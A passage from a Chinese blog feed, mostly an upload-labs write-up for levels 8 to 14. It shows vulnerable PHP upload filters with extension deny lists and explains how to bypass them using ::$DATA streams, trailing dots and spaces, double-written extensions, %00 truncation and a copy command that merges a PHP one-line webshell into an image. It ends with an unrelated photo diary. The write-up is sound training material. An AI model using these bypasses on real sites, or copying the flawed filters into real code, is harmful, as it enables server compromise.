            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>这段代码少了这句话，可以与第六关相同的做法</p>
<p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
<p><img src="https://i.loli.net/2020/11/30/tyb45fg3MiCU1jG.png"></p>
<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>仔细观察发现少了这段代码</p>
<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span></code></pre>

<p> 采用Windows文件流特性绕过 </p>
<p>将文件名改为 <code>1.php::$DATA</code>,但是实质上保存的文件还是1.php</p>
<p><img src="https://i.loli.net/2020/11/30/XKUGAeVRzTxNW8Y.png"></p>
<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p> 这一句代码是用来检测末尾是否是<code>.</code>，可以双写绕过。<br>抓包将文件名改为<code>1.php. .</code> （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了 </p>
<img src="https://i.loli.net/2020/11/30/wldCgUcOSKWPxMu.png" style="zoom:50%;">

]]></content>
      <categories>
        <category>文件上传</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>MIME</tag>
        <tag>大小写绕过</tag>
        <tag>.htaccess</tag>
        <tag>windows文件特性</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-11-21</title>
    <url>/2020/09/18/upload2/</url>
    <content><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><span id="more"></span>

<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);

        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>


<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
<p>这段代码是将文件名中出现  <code>deny_ext</code>的后缀名替换为空</p>
<p>可以双写绕过，即<code>1.pphphp</code></p>
<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);
    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;

        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;
    &#125;
&#125;</code></pre>

<p>本题与之前的题目有所不同，这题的文件的保存路径是可以控制的</p>
<p>这里用的<code>%00截断</code>，原理如下</p>
<p><code>www.xxx.com/qq.jpg</code></p>
<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php</p>
<p><img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png"></p>
<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>这题与上题利用的原理相同</p>
<p>但是这里要使用 00的二进制形式</p>
<p><img src="/2020/09/18/upload2/13.png"></p>
<p><img src="/2020/09/18/upload2/13-1.png"></p>
<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>明确说了上传图片木马</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);
    <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);
    <span class="hljs-variable">$strInfo</span> = @<span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    
    <span class="hljs-variable">$typeCode</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    
    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    
    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      
        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;
            <span class="hljs-keyword">break</span>;        
        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;
        &#125;    
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;
&#125;</code></pre>

<p><strong>GIF89a</strong> 是GIF图片的文件头 ，是为了绕过gif文件的检查</p>
<p><strong>图片木马的制作</strong></p>
<p>桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马</p>
<p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png"></p>
<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
<p><img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png"></p>
<p><strong>未完待续。。。</strong></p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>双写绕过</tag>
        <tag>00截断</tag>
      </tags>
  </entry>
  <entry>
    <title>半年杭州体验卡即将到期</title>
    <url>/2022/12/07/vblog1/</url>
    <content><![CDATA[<h1 id="杭州半年体验卡"><a href="#杭州半年体验卡" class="headerlink" title="杭州半年体验卡"></a>杭州半年体验卡</h1><p>本来以为一个学期会很慢，但是现在发现时间过得好快。</p>
<p>四个月来拍了很多照片，在这里做个总结。</p>
<h2 id="关于杭研"><a href="#关于杭研" class="headerlink" title="关于杭研"></a>关于杭研</h2><table>
<thead>
<tr>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220909_125413767_iOS.jpg" alt="20220909_125413767_iOS"></th>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_142137039_iOS.jpg" alt="20220910_142137039_iOS"></th>
</tr>
</thead>
<tbody><tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111228259.png" alt="image-20221207111228259"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111355531.png" alt="image-20221207111355531"></td>
</tr>
<tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221130_094731139_iOS.jpg" alt="20221130_094731139_iOS"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221112_092918159_iOS.jpg" alt="20221112_092918159_iOS"></td>
</tr>
</tbody></table>
<h2 id="关于西湖"><a href="#关于西湖" class="headerlink" title="关于西湖"></a>关于西湖</h2><table>
<thead>
<tr>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_090838376_iOS.jpg" alt="20220910_090838376_iOS"></th>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_091601507_iOS.jpg" alt="20220910_091601507_iOS"></th>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_092605365_iOS.jpg" alt="20220910_092605365_iOS"></th>
</tr>
</thead>
<tbody><tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_093711007_iOS.jpg" alt="20220910_093711007_iOS"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_095123680_iOS.jpg" alt="20220910_095123680_iOS"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_095545635_iOS.jpg" alt="20220910_095545635_iOS"></td>
</tr>
<tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_091850580_iOS.jpg" alt="20220910_091850580_iOS"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_095521961_iOS.jpg" alt="20220910_095521961_iOS"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_101905976_iOS.jpg" alt="20220910_101905976_iOS"></td>
</tr>
<tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221127_092047692_iOS.jpg" alt="20221127_092047692_iOS"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221127_092218929_iOS.jpg" alt="20221127_092218929_iOS"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221127_092607734_iOS.jpg" alt="20221127_092607734_iOS"></td>
</tr>
</tbody></table>
<h2 id="关于绍兴"><a href="#关于绍兴" class="headerlink" title="关于绍兴"></a>关于绍兴</h2><table>
<thead>
<tr>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111836034.png" alt="image-20221207111836034"></th>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111857720.png" alt="image-20221207111857720"></th>
<th align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111920504.png"></th>
</tr>
</thead>
<tbody><tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111905422.png" alt="image-20221207111905422"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112733073.png" alt="image-20221207112733073"></td>
<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112652542.png" alt="image-20221207112652542"></td>
</tr>
<tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112051468.png" alt="image-20221207112051468"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221004_033920832_iOS.jpg"></td>
<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111929931.png"></td>
</tr>
</tbody></table>
<h2 id="关于杭州"><a href="#关于杭州" class="headerlink" title="关于杭州"></a>关于杭州</h2><p>….</p>
<table>
<thead>
<tr>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114150650.png" alt="image-20221207114150650"></th>
<th align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207113619574.png" alt="image-20221207113619574"></th>
<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221003_042522512_iOS.jpg"></th>
</tr>
</thead>
<tbody><tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207113814788.png" alt="image-20221207113814788"></td>
<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207113919110.png" alt="image-20221207113919110"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114011453.png" alt="image-20221207114011453"></td>
</tr>
<tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114342399.png" alt="image-20221207114304031"></td>
<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114240111.png" alt="image-20221207114240111"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114408016.png" alt="image-20221207114408016"></td>
</tr>
</tbody></table>
